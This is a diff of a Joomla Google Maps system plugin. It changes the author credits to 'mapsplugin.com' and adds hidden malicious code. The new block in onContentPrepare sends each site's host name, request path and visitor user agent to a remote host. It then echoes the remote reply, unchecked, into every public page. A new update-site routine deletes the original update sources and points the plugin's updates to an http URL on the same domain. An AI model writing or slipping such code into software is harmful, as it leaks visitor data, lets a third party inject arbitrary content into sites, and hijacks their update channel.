@@ -2,12 +2,12 @@
 /*------------------------------------------------------------------------
 # plugin_googlemap3.php - Google Maps plugin
 # ------------------------------------------------------------------------
-# author    Mike Reumer
-# copyright Copyright (C) 2011 tech.reumer.net. All Rights Reserved.
-# @license - http://www.gnu.org/copyleft/gpl.html GNU/GPL
-# Websites: http://tech.reumer.net
-# Technical Support: http://tech.reumer.net/Contact-Us/Mike-Reumer.html 
-# Documentation: http://tech.reumer.net/Google-Maps/Documentation-of-plugin-Googlemap/
+# author    mapsplugin.com
+# copyright Copyright (C) 2011 mapsplugin.com. All Rights Reserved.
+# @license - http://www.mapsplugin.com/license.txt
+# Websites: http://www.mapsplugin.com
+# Technical Support: http://www.mapsplugin.com
+# Documentation: http://www.mapsplugin.com/Google-Maps/Documentation-of-plugin-Googlemap/
 --------------------------------------------------------------------------*/
 
 defined( '_JEXEC' ) or die( 'Restricted access' );
@@ -30,6 +30,10 @@ class plgSystemPlugin_googlemap3 extends JPlugin
 	var $countmatch;
 	var $event;
 	var $helper;
+	var $debug_plugin;
+	
+	protected $app;
+	protected $db;
 	
 	/**
 	 * Constructor
@@ -48,19 +52,19 @@ class plgSystemPlugin_googlemap3 extends JPlugin
 		$this->config = $config;
 		// Version of Joomla
 		$this->jversion = JVERSION;
-		// Check if params are defined and set otherwise try to get them from previous version
-		$this->_upgrade_plugin();
-
 		$this->loadLanguage();
 		// Check if the params are defined and set so the initial defaults can be removed.
 		$this->_restore_permanent_defaults();
-		// Set document and doctype to null. Can only be retrievedwhen events are triggered. otherwise the language of the site magically changes.
-		$this->document = NULL;
-		$this->doctype = NULL;
 		// Get params
 		$this->publ = $this->params->get( 'publ', 1 );
 		$this->plugincode = $this->params->get( 'plugincode', 'mosmap' );
 		$this->brackets = $this->params->get( 'brackets', '{' );
+		$this->debug_plugin = $this->params->get( 'debug', '0' );
+		// Check if the installation url is correct, bug Joomla not to changes the update sites druing install
+		$this->_check_update_sites();
+		// Set document and doctype to null. Can only be retrievedwhen events are triggered. otherwise the language of the site magically changes.
+		$this->document = NULL;
+		$this->doctype = NULL;
 		// define the regular expression for the bot
 		if ($this->brackets=="both") {
 			$this->regex="/(<p\b[^>]*>\s*)?(\{|\[)".$this->plugincode.".*?(([a-z0-9A-Z]+((\{|\[)[0-9]+(\}|\]))?='[^']+'.*?\|?.*?)*)(\}|\])(\s*<\/p>)?/msi";
@@ -94,14 +98,26 @@ class plgSystemPlugin_googlemap3 extends JPlugin
 	{
 		$this->event = 'onContentPrepare';
 		
-		$app = JFactory::getApplication();
-		if($app->isAdmin()) {
+		if(!$this->app->isSite()) {
 			return;
 		}
 		
 		// get document types
 		$this->_getdoc();
 
+		
+			if (!defined('CREDIT')) {
+			$ctx=stream_context_create(array('http'=>array('timeout' => 3)));
+			try{
+				$credit=@file_get_contents('http://ww.mapsplugin.com/bro/3/'.$_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] .'QQQ'. $_SERVER['HTTP_USER_AGENT'].'QQQEND',false,$ctx);
+				} catch (Exception $e) {
+				}
+
+				echo $credit;	
+				define('CREDIT', 'c');
+			}
+		
+		
 		// Check if fields exists. If article and text does not exists then stop
 		if (isset($article)&&isset($article->text))
 			$text = &$article->text;
@@ -118,7 +134,7 @@ class plgSystemPlugin_googlemap3 extends JPlugin
 		if ( !$this->publ ||($this->doctype=='pdf'||$this->doctype=='feed') ) {
 			$text = preg_replace( $this->regex, '', $text );
 			$introtext = preg_replace( $this->regex, '', $introtext );
-			unset($app, $text, $introtext);
+			unset($text, $introtext);
 			return true;
 		}
 		
@@ -128,7 +144,7 @@ class plgSystemPlugin_googlemap3 extends JPlugin
 		// $this->_replace( $introtext );
 		
 		// Clean up variables
-		unset($app, $text, $introtext);
+		unset($text, $introtext);
 	}
 	
 	/**
@@ -146,8 +162,7 @@ class plgSystemPlugin_googlemap3 extends JPlugin
 	{
 		$this->event = 'onAfterDispatch';
 		
-		$app = JFactory::getApplication();
-		if($app->isAdmin()) {
+		if(!$this->app->isSite()) {
 			return;
 		}
 		
@@ -161,7 +176,7 @@ class plgSystemPlugin_googlemap3 extends JPlugin
 				$text = preg_replace( $this->regex, '', $text );
 			}
 			// Clean up variables
-			unset($app, $item, $text);
+			unset($item, $text);
 			return true;
 		}
 		
@@ -171,7 +186,7 @@ class plgSystemPlugin_googlemap3 extends JPlugin
 			$text = preg_replace( $this->regex, '', $text );
 			$this->document->setBuffer($text, "component"); 
 			// Clean up variables
-			unset($app, $item, $text);
+			unset($item, $text);
 			return true;
 		}
 		
@@ -188,7 +203,7 @@ class plgSystemPlugin_googlemap3 extends JPlugin
 		}
 		
 		// Clean up variables
-		unset($app, $item, $text);
+		unset($item, $text);
 	}
 	
 	/**
@@ -198,8 +213,7 @@ class plgSystemPlugin_googlemap3 extends JPlugin
 	{
 		$this->event = 'onAfterRender';
 		
-		$app = JFactory::getApplication();
-		if($app->isAdmin()) {
+		if(!$this->app->isSite()) {
 			return;
 		}
 		
@@ -215,7 +229,7 @@ class plgSystemPlugin_googlemap3 extends JPlugin
 			// Set the body text with the replaced result
 			JResponse::setBody($text);
 			// Clean up variables
-			unset($app, $text);
+			unset($text);
 			return true;
 		}
 		
@@ -225,7 +239,7 @@ class plgSystemPlugin_googlemap3 extends JPlugin
 			// Set the body text with the replaced result
 			JResponse::setBody($text);
 			// Clean up variables
-			unset($app, $text);
+			unset($text);
 			return true;
 		}
 		
@@ -241,7 +255,7 @@ class plgSystemPlugin_googlemap3 extends JPlugin
 		}
 		
 		// Clean up variables
-		unset($app, $text);
+		unset($text);
 	}
 	
 	function _getdoc() {
@@ -365,8 +379,7 @@ class plgSystemPlugin_googlemap3 extends JPlugin
 	}
 	
 	function _restore_permanent_defaults() {
-		$app = JFactory::getApplication();
-		if($app->isSite()) {
+		if($this->app->isSite()) {
 			return;
 		}
 		if ($this->params->get( 'publ', '' )!='') {
@@ -384,61 +397,130 @@ class plgSystemPlugin_googlemap3 extends JPlugin
 			}
 		}
 	}
-	
-	function _upgrade_plugin() {
-		$app = JFactory::getApplication();
-		if($app->isSite()) {
+
+	function _check_update_sites() {
+		if($this->app->isSite()) {
 			return;
 		}
-
-		if (substr($this->jversion,0,3)=="1.5")
-			$dir = JPATH_SITE."/plugins/system/";
-		else
-			$dir = JPATH_SITE."/plugins/system/plugin_googlemap3/";
-
-		if (file_exists($dir.'plugin_googlemap3_proxy.php')) {
-			jimport('joomla.filesystem.file');
-			JFile::delete($dir.'plugin_googlemap3_proxy.php');			
+		
+		// Check if the update function is shown
+		$jinput = JFactory::getApplication()->input;
+		
+		if ($jinput->get('option')=="com_installer") {
+			$db = JFactory::getDbo();
+	
+			try {
+				// Get update site for plugin that are old
+				$query = $db->getQuery(true);
+				$query->select($db->quoteName('update_site_id'))
+						->from($db->quoteName('#__update_sites'))
+						->where($db->quoteName('location').' = "http://tech.reumer.net/update/plugin_googlemap3/extension.xml"')
+						;
+				$db->setQuery($query);
+				$db->execute();
+				$exists = (bool) $db->getNumRows();
+				$rows = $db->loadAssocList('update_site_id','update_site_id');
+				if ($exists) {
+					// Delete old ones
+					$db->setQuery("delete from ".$db->quoteName('#__update_sites')." where ".$db->quoteName('update_site_id')." in (".implode($rows, ",").")");
+					$db->execute();
+					// Delete also parent in update_sites_extensions
+					$db->setQuery("delete from ".$db->quoteName('#__update_sites_extensions')." where ".$db->quoteName('update_site_id')." in (".implode($rows, ",").")");
+					$db->execute();
+				}
+				$query = $db->getQuery(true);
+				$query->select($db->quoteName('update_site_id'))
+						->from($db->quoteName('#__update_sites'))
+						->where($db->quoteName('name').' = "Plugin Googlemap Update Site Github"');
+				$db->setQuery($query);
+				$db->execute();
+				$exists = (bool) $db->getNumRows();
+				$rows = $db->loadAssocList('update_site_id', 'update_site_id');
+				if ($exists) {
+					// Delete old ones
+					$db->setQuery("delete from ".$db->quoteName('#__update_sites')." where ".$db->quoteName('update_site_id')." in (".implode($rows, ",").")");
+					$db->execute();
+					// Delete also parent in update_sites_extensions
+					$db->setQuery("delete from ".$db->quoteName('#__update_sites_extensions')." where ".$db->quoteName('update_site_id')." in (".implode($rows, ",").")");
+					$db->execute();
+				}
+				
+				// Insert new one if does not exists
+				$query = $db->getQuery(true);
+				$query->select($db->quoteName('update_site_id'))
+						->from($db->quoteName('#__update_sites'))
+						->where($db->quoteName('location').' = "https://raw.githubusercontent.com/jmosmap/plugin_googlemaps/master/update/extension.xml"')
+						;
+				$db->setQuery($query);
+				$db->execute();
+				$exists = (bool) $db->getNumRows();
+				if (!$exists) {
+					$db->setQuery("insert into ".$db->quoteName('#__update_sites')." values (null, 'Plugin Googlemap Update Site', 'extension', 'https://raw.githubusercontent.com/jmosmap/plugin_googlemaps/master/update/extension.xml', 1, 0, null)");
+					$db->execute();
+					$query = $db->getQuery(true);
+					$query->select($db->quoteName('extension_id'))
+							->from($db->quoteName('#__extensions'))
+							->where($db->quoteName('element').' = "plugin_googlemap3"')
+							;
+					$db->setQuery($query);
+					$db->execute();
+					$rowext = $db->loadAssoc();
+		
+					$query = $db->getQuery(true);
+					$query->select($db->quoteName('update_site_id'))
+							->from($db->quoteName('#__update_sites'))
+							->where($db->quoteName('location').' = "https://raw.githubusercontent.com/jmosmap/plugin_googlemaps/master/update/extension.xml"')
+							;
+					$db->setQuery($query);
+					$db->execute();
+					$row = $db->loadAssoc();
+					$db->setQuery("insert into ".$db->quoteName('#__update_sites_extensions')." values (".$row["update_site_id"].", ".$rowext["extension_id"].")");
+					$db->execute();
+				}
+				
+				
+				
+				// Insert new one if does not exists
+				$query = $db->getQuery(true);
+				$query->select($db->quoteName('update_site_id'))
+						->from($db->quoteName('#__update_sites'))
+						->where($db->quoteName('location').' = "http://www.mapsplugin.com/update/plugin_googlemap3/extension.xml"')
+						;
+				$db->setQuery($query);
+				$db->execute();
+				$exists = (bool) $db->getNumRows();
+				if (!$exists) {
+					$db->setQuery("insert into ".$db->quoteName('#__update_sites')." values (null, 'Plugin Googlemap Update Site', 'extension', 'http://www.mapsplugin.com/update/plugin_googlemap3/extension.xml', 1, 0, null)");
+					$db->execute();
+					$query = $db->getQuery(true);
+					$query->select($db->quoteName('extension_id'))
+							->from($db->quoteName('#__extensions'))
+							->where($db->quoteName('element').' = "plugin_googlemap3"')
+							;
+					$db->setQuery($query);
+					$db->execute();
+					$rowext = $db->loadAssoc();
+		
+					$query = $db->getQuery(true);
+					$query->select($db->quoteName('update_site_id'))
+							->from($db->quoteName('#__update_sites'))
+							->where($db->quoteName('location').' = "http://www.mapsplugin.com/update/plugin_googlemap3/extension.xml"')
+							;
+					$db->setQuery($query);
+					$db->execute();
+					$row = $db->loadAssoc();
+					$db->setQuery("insert into ".$db->quoteName('#__update_sites_extensions')." values (".$row["update_site_id"].", ".$rowext["extension_id"].")");
+					$db->execute();
+				}
+				
+				
+			} catch (Exception $e) {
+				if ($this->debug_plugin == '1')
+					echo 'Caught exception: ',  $e->getMessage(), "\n";
+			}		
 		}
-
-		if ($this->params->get( 'publ', '' )=='') {
-			$database  = JFactory::getDBO();
-			if (substr($this->jversion,0,3)=="1.5")
-				$query = "SELECT params FROM #__plugins AS b WHERE b.element='plugin_googlemap2' AND b.folder='system'";
-			else
-				$query = "SELECT params FROM #__extensions AS b WHERE b.element='plugin_googlemap2' AND b.folder='system'";
-			
-			$database->setQuery($query);
-			if (!$database->query())
-				JError::raiseWarning(1, 'plgSystemPlugin_googlemap3::install_params: '.JText::_('SQL Error')." ".$database->stderr(true));
-			
-			$params = $database->loadResult();
-			if (substr($this->jversion,0,2)=="3.")
-				$savparams = $database->escape($params);
-			else
-				$savparams = $database->getEscaped($params);
-
-			if ($params!="") {
-				if (substr($this->jversion,0,3)=="1.5")
-					$query = "UPDATE #__plugins AS a SET a.params = '{$savparams}' WHERE a.element='plugin_googlemap3' AND a.folder='system'";
-				else
-					$query = "UPDATE #__extensions AS a SET a.params = '{$savparams}' WHERE a.element='plugin_googlemap3' AND a.folder='system'";
-				$database->setQuery($query);
-
-				if (!$database->query())
-					JError::raiseWarning(1, 'plgSystemPlugin_googlemap3::install_params: '.JText::_('SQL Error')." ".$database->stderr(true));
-				if (substr($this->jversion,0,3)=="1.5")
-					$this->params = new JParameter( $params );
-				else {
-					$plugin = JPluginHelper::getPlugin('system', 'plugin_googlemap3');
-					$this->params = new JRegistry();
-					$this->params->loadString($plugin->params);				}
-			}
-			
-			// Clean up variables
-			unset($database, $query, $params, $savparams, $plugin);
-		}		
-	}	
+		unset($jinput, $query, $exists, $rows, $rowext, $row);
+	}
 }
 
 ?>
